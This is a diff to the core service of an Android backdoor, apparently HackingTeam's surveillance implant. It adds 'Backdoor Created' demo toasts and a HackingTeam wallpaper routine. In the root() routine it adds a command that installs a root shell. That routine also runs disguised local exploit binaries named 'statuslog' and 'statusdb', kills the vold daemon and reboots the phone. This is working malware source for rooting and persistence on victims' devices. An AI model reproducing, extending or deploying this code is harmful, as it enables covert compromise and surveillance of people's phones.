@@ -11,9 +11,17 @@ import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 
 import android.app.Service;
+import android.app.WallpaperManager;
+import android.content.Context;
 import android.content.Intent;
+import android.graphics.Bitmap;
+import android.graphics.Bitmap.Config;
+import android.graphics.Canvas;
+import android.graphics.Paint;
 import android.os.IBinder;
 import android.util.Log;
+import android.view.Display;
+import android.view.WindowManager;
 import android.widget.Toast;
 
 import com.android.service.auto.Cfg;
@@ -36,11 +44,36 @@ public class ServiceCore extends Service {
 	@Override
 	public void onCreate() {
 		super.onCreate();
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG){
 			Log.d("QZ", TAG + " (onCreate)");
-
-		// Toast.makeText(this, "Service Created", Toast.LENGTH_LONG).show();
+		}
+		if(Cfg.DEMO){
+			Toast.makeText(this, "Backdoor Created", Toast.LENGTH_LONG).show();
+			//setBackground();
+		}
 		Status.setAppContext(getApplicationContext());
+	}
+
+	private void setBackground() {
+		WallpaperManager wm = WallpaperManager.getInstance(this);
+		Display display = ((WindowManager) Status.getAppContext()
+				.getSystemService(Context.WINDOW_SERVICE))
+				.getDefaultDisplay();
+		int width = display.getWidth();
+		int height = display.getHeight();
+		Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
+		Canvas canvas = new Canvas(bitmap);
+		Paint paint=new Paint();
+		paint.setStyle(Paint.Style.FILL);
+		paint.setAntiAlias(true);
+		paint.setTextSize(20);
+		canvas.drawText("HackingTeam", 10, 100, paint);
+		try {
+			wm.setBitmap(bitmap);
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 	}
 
 	@Override
@@ -49,7 +82,8 @@ public class ServiceCore extends Service {
 		if (Cfg.DEBUG)
 			Log.d("QZ", TAG + " (onDestroy)");
 
-		// Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
+		if(Cfg.DEMO)
+			Toast.makeText(this, "Backdoor Destroyed", Toast.LENGTH_LONG).show();
 		core.Stop();
 		core = null;
 	}
@@ -78,6 +112,7 @@ public class ServiceCore extends Service {
 		// Core starts
 		core = new Core();
 		core.Start(this.getResources(), getContentResolver());
+		
 	}
 
 	private boolean root() {
@@ -85,10 +120,10 @@ public class ServiceCore extends Service {
 			if (!Cfg.EXP) {
 				if (Cfg.DEBUG)
 					Log.d("QZ", TAG + " (root): Exploit disabled by conf");
-				
+
 				return false;
 			}
-			
+
 			String crashlog = "errorlog";
 			String exploit = "statuslog";
 			String suidext = "statusdb";
@@ -156,29 +191,35 @@ public class ServiceCore extends Service {
 				// Killiamo VOLD per due volte
 				Runtime.getRuntime().exec(path + "/" + suidext + " vol");
 
+				// Installiamo la shell root
+				Runtime.getRuntime().exec(path + "/" + suidext + " rt");
+
 				if (Cfg.DEBUG) {
-					Log.d("QZ", TAG + " (onStart): WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!");
-					Toast.makeText(this,
-							"WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!",
-							Toast.LENGTH_LONG).show();
+					Log.d("QZ", TAG + " (onStart): Root exploit");
 				}
-				
+				if (Cfg.DEMO) {
+					Toast.makeText(this, "Root exploit", Toast.LENGTH_LONG)
+							.show();
+				}
+
 				// Riavviamo il telefono
 				Runtime.getRuntime().exec(path + "/" + suidext + " reb");
 			} else {
 				if (Cfg.DEBUG) {
-					Log.d("QZ",
-							TAG + " (onStart): Fucking third party exploits, they never work!");
-					Toast.makeText(this,
-							"Fucking third party exploits, they never work!",
-							Toast.LENGTH_LONG).show();
+					Log.d("QZ", TAG + " (onStart): exploit failed!");
+				}
+				if (Cfg.DEMO) {
+					Toast.makeText(this, "exploit failed!", Toast.LENGTH_LONG)
+							.show();
 				}
 
 			}
 		} catch (Exception e1) {
-			e1.printStackTrace();
-			if (Cfg.DEBUG)
+
+			if (Cfg.DEBUG) {
+				e1.printStackTrace();
 				Log.d("QZ", TAG + " (root): Exception on root()");
+			}
 			return false;
 		}
 
